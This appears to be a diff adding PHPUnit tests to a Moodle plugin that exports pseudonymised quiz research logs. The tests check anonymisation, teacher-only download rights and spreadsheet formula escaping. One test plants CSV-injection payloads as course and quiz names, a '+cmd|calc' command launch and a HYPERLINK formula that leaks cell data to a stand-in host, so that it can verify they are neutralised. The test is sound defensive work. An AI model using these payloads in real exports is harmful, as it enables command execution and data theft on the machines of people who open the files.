@@ -16,6 +16,7 @@
 namespace local_hand2stack;
 
 use local_hand2stack\local\input_mode;
+use local_hand2stack\local\research_export;
 use local_hand2stack\local\research_logger;
 
 defined('MOODLE_INTERNAL') || die();
@@ -27,6 +28,7 @@ require_once($CFG->dirroot . '/mod/quiz/locallib.php');
 /**
  * @covers \local_hand2stack\local\research_logger
  * @covers \local_hand2stack\local\input_mode
+ * @covers \local_hand2stack\local\research_export
  * @covers \local_hand2stack\privacy\provider
  */
 final class research_logger_test extends \advanced_testcase {
@@ -52,14 +54,16 @@ final class research_logger_test extends \advanced_testcase {
     }
 
     /** A quiz in the given input mode and the user's started attempt, as [quiz, usageid, slot]. */
-    private function create_quiz_attempt(\stdClass $user, string $mode): array {
-        $course = $this->getDataGenerator()->create_course();
-        $quiz = $this->getDataGenerator()->create_module('quiz', ['course' => $course->id]);
+    private function create_quiz_attempt(\stdClass $user, string $mode, array $names = []): array {
+        $course = $this->getDataGenerator()->create_course(array_filter(['shortname' => $names['course'] ?? null]));
+        $quiz = $this->getDataGenerator()->create_module('quiz',
+            ['course' => $course->id] + array_filter(['name' => $names['quiz'] ?? null]));
         input_mode::set_for_cm((int)$quiz->cmid, $mode);
 
         $questiongenerator = $this->getDataGenerator()->get_plugin_generator('core_question');
         $category = $questiongenerator->create_question_category();
-        $question = $questiongenerator->create_question('shortanswer', null, ['category' => $category->id]);
+        $question = $questiongenerator->create_question('shortanswer', null,
+            ['category' => $category->id] + array_filter(['name' => $names['question'] ?? null]));
         quiz_add_quiz_question($question->id, $quiz);
         \mod_quiz\quiz_settings::create($quiz->id)->get_grade_calculator()->recompute_quiz_sumgrades();
 
@@ -108,6 +112,9 @@ final class research_logger_test extends \advanced_testcase {
 
     public function test_normalise_event_rejects_unknown_types_and_malformed_ids(): void {
         $this->assertNotNull(research_logger::normalise_event($this->event(1, 1)));
+        foreach (['task_started', 'submit_confirmed', 'task_finished'] as $type) {
+            $this->assertNotNull(research_logger::normalise_event($this->event(1, 1, ['type' => $type])));
+        }
         $this->assertNull(research_logger::normalise_event($this->event(1, 1, ['type' => 'keypress'])));
         $this->assertNull(research_logger::normalise_event($this->event(1, 1, ['eventid' => 'not-a-uuid'])));
         $this->assertNull(research_logger::normalise_event($this->event(1, 1, ['schema' => 99])));
@@ -255,5 +262,139 @@ final class research_logger_test extends \advanced_testcase {
 
         course_delete_module((int)$quiz->cmid);
         $this->assertFalse($DB->record_exists('local_hand2stack_cm', ['cmid' => $quiz->cmid]));
+    }
+
+    public function test_export_of_a_quiz_is_pseudonymised_and_carries_condition_and_final_mark(): void {
+        $this->resetAfterTest();
+        $this->enable_study();
+
+        $user = $this->getDataGenerator()->create_user();
+        $this->make_participant($user);
+        [$quiz, $usageid, $slot] = $this->create_quiz_attempt($user, input_mode::LOGONLY);
+        [, $otherusage] = $this->create_quiz_attempt($user, input_mode::NORMAL);
+        [$previewusage, $previewslot] = $this->create_preview_usage($user);
+        research_logger::record_batch([
+            $this->event($usageid, $slot, ['modality' => 'keyboard']),
+            $this->event($otherusage, $slot),
+            $this->event($previewusage, $previewslot),
+        ], (int)$user->id);
+
+        // The learner answers correctly and submits; the export shows the final mark.
+        $this->setUser($user);
+        $attemptobj = \mod_quiz\quiz_attempt::create_from_usage_id($usageid);
+        $attemptobj->process_submitted_actions(time(), false, [$slot => ['answer' => 'frog']]);
+        $attemptobj->process_finish(time(), false);
+        $this->setUser(null);
+
+        $this->assertSame(['pilot2026a'], research_export::study_ids((int)$quiz->cmid));
+        $this->assertSame(1, research_export::count('pilot2026a', (int)$quiz->cmid));
+        $this->assertSame(3, research_export::count('pilot2026a'));
+
+        $records = research_export::recordset('pilot2026a', (int)$quiz->cmid);
+        $rows = [];
+        foreach ($records as $record) {
+            $rows[] = array_combine(research_export::COLUMNS, research_export::row($record));
+        }
+        $records->close();
+
+        $this->assertCount(1, $rows);
+        $row = $rows[0];
+        $this->assertSame('keyboard', $row['studycondition']);
+        $this->assertSame((int)$quiz->cmid, (int)$row['cmid']);
+        $this->assertSame(research_logger::anon_attempt_id($usageid, 'pilot2026a'), $row['anonattemptid']);
+        $this->assertSame(research_logger::anon_user_id((int)$user->id, 'pilot2026a'), $row['anonuserid']);
+        $this->assertSame('gradedright', $row['finalstate']);
+        $this->assertEqualsWithDelta(1.0, $row['finalfraction'], 1e-7);
+        $this->assertEqualsWithDelta((float)$row['maxmark'], $row['finalmark'], 1e-7);
+        $this->assertMatchesRegularExpression('/^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d\.\d{3}Z$/', $row['clienttimeiso']);
+        // Nothing in the file leads back to the learner.
+        foreach (['usageid', 'userid', 'username', 'firstname', 'lastname', 'email'] as $column) {
+            $this->assertNotContains($column, research_export::COLUMNS);
+        }
+        $this->assertNotContains((string)$usageid, [(string)$row['anonattemptid']]);
+    }
+
+    public function test_only_teachers_and_managers_may_download_a_quiz_log(): void {
+        $this->resetAfterTest();
+
+        $course = $this->getDataGenerator()->create_course();
+        $quiz = $this->getDataGenerator()->create_module('quiz', ['course' => $course->id]);
+        $context = \context_module::instance((int)$quiz->cmid);
+        $teacher = $this->getDataGenerator()->create_and_enrol($course, 'editingteacher');
+        $assistant = $this->getDataGenerator()->create_and_enrol($course, 'teacher');
+        $student = $this->getDataGenerator()->create_and_enrol($course, 'student');
+
+        $this->assertTrue(has_capability('local/hand2stack:exportlogs', $context, $teacher));
+        $this->assertFalse(has_capability('local/hand2stack:exportlogs', $context, $assistant));
+        $this->assertFalse(has_capability('local/hand2stack:exportlogs', $context, $student));
+        // A teacher here has no right in another course.
+        $othercourse = $this->getDataGenerator()->create_course();
+        $otherquiz = $this->getDataGenerator()->create_module('quiz', ['course' => $othercourse->id]);
+        $this->assertFalse(has_capability('local/hand2stack:exportlogs',
+            \context_module::instance((int)$otherquiz->cmid), $teacher));
+    }
+
+    public function test_spreadsheet_exports_never_turn_names_into_formulas(): void {
+        $this->resetAfterTest();
+        $this->enable_study();
+
+        $user = $this->getDataGenerator()->create_user();
+        $this->make_participant($user);
+        $names = [
+            'course' => '+cmd|calc',
+            'quiz' => '=HYPERLINK("https://example.invalid/?leak="&A1,"Open")',
+            'question' => '@SUM(1+1)',
+        ];
+        [$quiz, $usageid, $slot] = $this->create_quiz_attempt($user, input_mode::NORMAL, $names);
+        research_logger::record_batch([$this->event($usageid, $slot)], (int)$user->id);
+
+        $rowfor = function(bool $spreadsheet) use ($quiz): array {
+            $records = research_export::recordset('pilot2026a', (int)$quiz->cmid);
+            $rows = [];
+            foreach ($records as $record) {
+                $rows[] = array_combine(research_export::COLUMNS, research_export::row($record, $spreadsheet));
+            }
+            $records->close();
+            $this->assertCount(1, $rows);
+            return $rows[0];
+        };
+
+        $row = $rowfor(true);
+        $this->assertSame("'" . $names['course'], $row['course']);
+        $this->assertSame("'" . $names['quiz'], $row['quiz']);
+        $this->assertSame("'" . $names['question'], $row['question']);
+        // Ordinary values are untouched, and numbers stay numbers.
+        $this->assertSame('edit_committed', $row['eventtype']);
+        $this->assertStringStartsWith('{', $row['payload']);
+        $this->assertNull($row['finalfraction']);
+
+        // JSON and HTML downloads keep the names exactly as written.
+        $raw = $rowfor(false);
+        $this->assertSame($names['quiz'], $raw['quiz']);
+        $this->assertSame($names['course'], $raw['course']);
+
+        // Through Moodle's own CSV writer the prefix is applied once, not twice.
+        $records = research_export::recordset('pilot2026a', (int)$quiz->cmid);
+        $path = \core\dataformat::write_data('h2s-formula', 'csv', research_export::COLUMNS, $records,
+            fn(\stdClass $record) => research_export::row($record, true));
+        $records->close();
+        $csv = file_get_contents($path);
+        $this->assertStringContainsString("'=HYPERLINK(", $csv);
+        $this->assertStringNotContainsString("''=HYPERLINK(", $csv);
+        $this->assertStringContainsString("'@SUM(1+1)", $csv);
+        $this->assertStringNotContainsString(',=HYPERLINK(', $csv);
+        $this->assertStringNotContainsString(',"=HYPERLINK(', $csv);
+    }
+
+    public function test_formula_escaping_matches_the_owasp_rules(): void {
+        $this->assertSame("'=1+1", research_export::escape_formula('=1+1'));
+        $this->assertSame("'  -2", research_export::escape_formula('  -2'));
+        $this->assertSame("'+A1", research_export::escape_formula('+A1'));
+        $this->assertSame("'@cmd", research_export::escape_formula('@cmd'));
+        $this->assertSame('-', research_export::escape_formula('-'));
+        $this->assertSame("'=x", research_export::escape_formula("'=x"));
+        $this->assertSame('x=1', research_export::escape_formula('x=1'));
+        $this->assertSame(-0.5, research_export::escape_formula(-0.5));
+        $this->assertNull(research_export::escape_formula(null));
     }
 }
